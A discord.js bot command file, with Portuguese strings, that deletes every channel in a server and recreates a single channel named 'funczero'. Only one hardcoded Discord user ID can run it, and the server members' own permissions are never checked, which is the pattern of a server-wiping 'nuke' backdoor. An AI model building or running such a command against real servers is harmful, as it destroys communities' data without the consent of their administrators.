const { EmbedBuilder, ChannelType } = require('discord.js');
const { yellow, red } = require('../../config/colors.json');
const { icon_attention } = require('../../config/emoji.json');

module.exports = {
  name: 'clearchannels',
  description: 'Apaga todos os canais do servidor e cria um canal chamado FuncZero.',
  usage: '.clearchannels',
  userPermissions: [],
  botPermissions: ['ManageChannels'],
  deleteMessage: true,

  async execute(message) {

    if (message.author.id !== '1006909671908585586') return;
    
    const allChannels = message.guild.channels.cache;

    if (allChannels.size === 0) {
      const embedErro = new EmbedBuilder()
        .setColor(yellow)
        .setAuthor({
          name: 'Não há canais para apagar neste servidor.',
          iconURL: icon_attention,
        });

      return message.reply({ embeds: [embedErro], allowedMentions: { repliedUser: false } });
    }

    try {
      for (const channel of allChannels.values()) {
        await channel.delete('Comando .clearchannels executado por proprietário autorizado.');
      }

      const newChannel = await message.guild.channels.create({
        name: 'funczero',
        type: ChannelType.GuildText,
        reason: 'Canal principal recriado após limpeza de canais.'
      });

      return newChannel.send({
        embeds: [
          new EmbedBuilder()
            .setColor('Green')
            .setTitle('<:Adicionado:1355700382642208948> Canais Resetados')
            .setDescription('Todos os canais foram apagados e este canal foi criado com sucesso.')
            .setFooter({ text: message.author.tag, iconURL: message.author.displayAvatarURL() })
            .setTimestamp()
        ],
        allowedMentions: { repliedUser: false }
      });

    } catch (error) {
      console.error(error);

      const embedErro = new EmbedBuilder()
        .setColor(red)
        .setAuthor({
          name: 'Ocorreu um erro ao tentar apagar ou criar canais.',
          iconURL: icon_attention,
        });

      return message.reply({ embeds: [embedErro], allowedMentions: { repliedUser: false } });
    }
  }
};
